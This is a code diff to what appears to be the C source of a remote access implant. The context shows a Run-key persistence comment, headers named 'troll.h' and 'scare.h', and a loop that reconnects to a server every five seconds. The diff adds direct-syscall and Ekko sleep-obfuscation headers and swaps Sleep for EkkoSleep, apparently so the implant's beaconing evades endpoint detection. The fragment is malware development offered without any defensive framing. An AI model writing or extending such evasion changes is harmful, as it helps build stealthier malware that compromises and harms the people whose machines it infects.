@@ -27,6 +27,8 @@
 #include "troll.h"
 #include "scare.h"
 #include "../include/crypto.h"
+#include "syscalls.h"
+#include "ekko.h"
 
 
 // Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
@@ -737,7 +739,7 @@ int EstablishConnection(const char *ServerIp, unsigned short ServerPort)
   // Connect every 5 seconds
   while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
   {
-    Sleep(5000);
+    EkkoSleep(5000);
   }
 
   // Perform key exchange
